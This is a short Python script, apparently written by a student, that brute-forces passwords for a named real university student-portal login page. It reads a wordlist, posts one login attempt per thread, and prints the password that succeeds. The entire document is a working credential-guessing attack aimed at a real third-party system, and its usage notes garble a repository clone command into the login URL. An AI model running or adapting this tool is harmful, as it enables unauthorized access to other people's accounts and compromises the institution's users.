'''

Tite: GctuSip_bruteforcer.py
Author: Bismark Aryeetey
Date: 5 December 2022

Usage:
[+]clone this repo by run < git clone https://erp.gctu.edu.gh/sip/auth/login.php > in terminal
[+]cd GctuSip_bruteforcer/
[+]run: python GctuSip_bruteforcer.py -u <username> -w <wordlist>

'''
import sys
import threading
import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--username','-u', type=str, required=True)
parser.add_argument('--wordlist','-w', type=str, required=True)

args = parser.parse_args()


username = args.username
wordlists_path = args.wordlist
url = 'https://erp.gctu.edu.gh/sip/auth/login.php'

def cracking(login):
    r = requests.post(url, data=login)
    if r.text == 'ok':
        print("Password found:%s" %(login['password']))
        passwd_found = True
        sys.exit()
    else:
        print("[*]checking %s with username:%s and password:%s" %(url, username, login['password']))







#reading wordlist file
def main():
    with open(wordlists_path, errors="replace") as wordlists:
        try:
            for passwd in wordlists.readlines():

                passwd = passwd.strip('\n')
                data = {'username':username, 'password':passwd}
                t1 = threading.Thread(target=cracking, args=(data,))
                t1.start()
        except KeyboardInterrupt:
            print("[+]Quitting... ")


if __name__ == '__main__':
    main()



#https://play.picoctf.org/login